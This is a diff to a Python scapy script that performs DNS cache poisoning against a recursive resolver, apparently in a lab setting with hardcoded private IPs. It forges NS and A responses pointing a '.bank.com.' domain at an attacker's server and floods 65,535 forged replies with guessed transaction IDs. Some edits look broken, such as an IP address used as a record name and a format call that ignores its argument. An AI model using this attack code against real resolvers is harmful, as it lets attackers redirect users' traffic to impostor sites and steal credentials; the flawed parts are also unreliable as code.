@@ -5,15 +5,15 @@ from threading import Thread
 from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sendpfast, Ether
 
 # Vulnerable recursive DNS server settings
-victim_dns_ip = os.environ['VLN_SERVER_IP']
-victim_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
-victim_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
+victim_dns_ip = "192.168.0.25"
+victim_dns_port_in = int("53")
+victim_dns_port_out = int("54")
 
 # Target domain base to be messed with
 victim_host_base = ".bank.com."
 
 # Malicious DNS server
-attacker_dns_ip = os.environ['ATK_SERVER_IP']
+attacker_dns_ip = "192.168.0.26"
 
 MAX_TTL = 60 * 60 * 24 * 7
 
@@ -51,7 +51,7 @@ def forged_ns_response(id, target_domain, known_ns_domain, known_ns_ip):
         rcode=0,  # Response code from the server: indicates success or failure
         # 0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 5:"refused"
         qdcount=1,  # Question record count
-        ancount=0,  # Answer count
+        ancount=1,  # Answer count
         nscount=1,  # authority count
         arcount=1,  # additional record count
         # AD and CD bits are defined in RFC 2535
@@ -60,7 +60,7 @@ def forged_ns_response(id, target_domain, known_ns_domain, known_ns_ip):
         # DNS Question Record
         qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
         # DNS Resource Record
-        an=0,
+		an=DNSRR(rrname="12.34.56.78", type='A', rclass='IN', rdata=attacker_dns_ip, ttl=MAX_TTL),
         ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=MAX_TTL),
         ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
     )
@@ -112,19 +112,31 @@ class Poison(Thread):
             else:
                 print("Poisoning failed")
 
-
 if __name__ == '__main__':
-    known_ns_domain = "ns01.cashparking.com."
-    known_ns_ip = "216.69.185.38"
-
-    known_ns_domain_2 = "ns02.cashparking.com."
-    known_ns_ip_2 = "208.109.255.38"
-
-    t1 = Poison(150, known_ns_domain, known_ns_ip, 'a')
-    t2 = Poison(150, known_ns_domain_2, known_ns_ip_2, 'b')
-    try:
-        t1.start()
-        t2.start()
-    except KeyboardInterrupt:
-        t1.running = False
-        t2.running = False
+        known_ns_domain = "ns01.cashparking.com."
+        known_ns_ip = "216.69.185.38"
+#
+#    known_ns_domain_2 = "ns02.cashparking.com."
+#    known_ns_ip_2 = "208.109.255.38"
+#
+#    t1 = Poison(150, known_ns_domain, known_ns_ip, 'a')
+#    t2 = Poison(150, known_ns_domain_2, known_ns_ip_2, 'b')
+#    try:
+#        t1.start()
+#        t2.start()
+#    except KeyboardInterrupt:
+#        t1.running = False
+#        t2.running = False
+        target_domain = "www1234".format(victim_host_base)
+        packet_list = [Ether() / a_request(target_domain)]
+        for i in range(int("ffff", 16)):
+                packet_list.append(
+                    forged_ns_response(
+                        i,
+                        target_domain,
+                        known_ns_domain,
+                        known_ns_ip
+                    )
+                )
+        sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
+        ns_response = sr1(a_request(known_ns_domain), verbose=0)
